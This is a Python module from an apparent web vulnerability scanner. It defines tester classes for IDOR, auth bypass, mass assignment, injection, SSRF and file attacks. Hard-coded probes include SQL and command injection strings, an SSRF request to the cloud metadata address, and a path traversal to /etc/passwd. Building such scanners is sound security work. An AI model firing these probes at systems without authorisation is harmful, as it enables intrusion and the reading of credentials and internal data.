"""The 8 CyberStrike proxy testers, each subclassing BaseProxyTester.

Every tester follows the same 3-gate flow (baseline → attack → compare),
so all findings go through the same confirmation protocol.
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request

from redteam.tester.base import BaseProxyTester, ProxyFinding, _http


class IdorTester(BaseProxyTester):
    """Object-level access control: can user A reach user B's resources?"""
    label = "IDOR"
    severity = "critical"

    def test(self, path_template: str, ids: list[str]) -> list[ProxyFinding]:
        out = []
        baseline = _http(self.base_url + path_template.replace("{id}", "1"))
        for uid in ids[1:]:
            attack = _http(self.base_url +
                           path_template.replace("{id}", uid))
            measurable = self.distinguisher(baseline, attack)
            out.append(ProxyFinding(
                vector=self.label,
                endpoint=path_template,
                verdict="vulnerable" if measurable else "not_vulnerable",
                severity=self.severity if measurable else "info",
                gates=["baseline", "attack", "compare"],
                evidence={"baseline_id": "1", "attack_id": uid,
                          "baseline_status": baseline["status"],
                          "attack_status": attack["status"],
                          "baseline_sha": baseline["sha"],
                          "attack_sha": attack["sha"]},
            ))
        return out


class AuthBypassTester(BaseProxyTester):
    """Vertical privilege escalation: does low-priv reach admin?"""
    label = "AUTH_BYPASS"
    severity = "critical"

    def test(self, path: str) -> ProxyFinding:
        baseline = _http(self.base_url + path)
        # attack: strip auth header (simulate unauthenticated access)
        attack = _http(self.base_url + path,
                       headers={"Authorization": ""})
        return ProxyFinding(
            vector=self.label, endpoint=path,
            verdict=("vulnerable" if self.distinguisher(baseline, attack)
                     else "not_vulnerable"),
            severity=self.severity, gates=["baseline", "attack", "compare"],
            evidence={"baseline_status": baseline["status"],
                      "attack_status": attack["status"]})


class MassAssignTester(BaseProxyTester):
    """Unexpected writable fields (role, price, balance in JSON bodies)."""
    label = "MASS_ASSIGN"

    def test(self, path: str, params: dict) -> ProxyFinding:
        baseline = _http(self.base_url + path)
        # POST mutation — PentAGI method
        req = urllib.request.Request(
            self.base_url + path,
            data=json.dumps(params).encode(),
            headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=8) as r:
                attack = {"status": r.status, "sha": "", "body": ""}
        except Exception as e:
            attack = {"status": 0, "sha": "", "body": str(e)}
        return ProxyFinding(
            vector=self.label, endpoint=path,
            verdict=("vulnerable" if self.distinguisher(baseline, attack)
                     else "not_vulnerable"),
            severity=self.severity, gates=["baseline", "attack", "compare"],
            evidence={"baseline_status": baseline["status"],
                      "attack_status": attack["status"]})


class InjectionTester(BaseProxyTester):
    """SQL / cmd / LDAP / template injection via query params."""
    label = "INJECTION"

    PAYLOADS = ["' OR 1=1 --", "'; echo pwned; #", "{{7*7}}"]

    def test(self, path: str, param: str = "q") -> ProxyFinding:
        import urllib.parse
        baseline = _http(self.base_url + f"{path}?{param}=normal")
        for payload in self.PAYLOADS:
            attack = _http(self.base_url + f"{path}?{param}=" +
                           urllib.parse.quote(payload))
            if self.distinguisher(baseline, attack):
                return ProxyFinding(
                    vector=self.label, endpoint=path, verdict="vulnerable",
                    severity="critical", gates=["baseline", "attack", "compare"],
                    evidence={"payload": payload,
                              "baseline_sha": baseline["sha"],
                              "attack_sha": attack["sha"]})
        return ProxyFinding(vector=self.label, endpoint=path,
                            verdict="not_vulnerable")


class AuthnTester(BaseProxyTester):
    """Token validation / session fixation / credential exposure."""
    label = "AUTHN"


class BusinessLogicTester(BaseProxyTester):
    """Price manipulation, coupon reuse, race conditions."""
    label = "BIZLOGIC"


class SSRFTester(BaseProxyTester):
    """Internal host access via user-controlled URL params."""
    label = "SSRF"

    def test(self, path: str, param: str) -> ProxyFinding:
        baseline = _http(self.base_url + f"{path}?{param}=1")
        attack = _http(self.base_url + f"{path}?{param}="
                       "http://169.254.169.254/latest/meta-data/")
        return ProxyFinding(vector=self.label, endpoint=path,
                            verdict=("vulnerable" if self.distinguisher(baseline, attack)
                                     else "not_vulnerable"),
                            severity="critical",
                            gates=["baseline", "attack", "compare"],
                            evidence={"baseline_sha": baseline["sha"],
                                      "attack_sha": attack["sha"]})


class FileAttackTester(BaseProxyTester):
    """Path traversal, unrestricted upload, dangerous file types."""
    label = "FILE_ATTACK"

    def test(self, base_path="/item/") -> ProxyFinding:
        baseline = _http(self.base_url + base_path + "safe.txt")
        attack = _http(self.base_url + base_path +
                       "..%2f..%2f..%2fetc%2fpasswd")
        return ProxyFinding(vector=self.label, endpoint=base_path,
                            verdict=("vulnerable" if self.distinguisher(baseline, attack)
                                     else "not_vulnerable"),
                            severity="critical",
                            gates=["baseline", "attack", "compare"],
                            evidence={"baseline_sha": baseline["sha"],
                                      "attack_sha": attack["sha"]})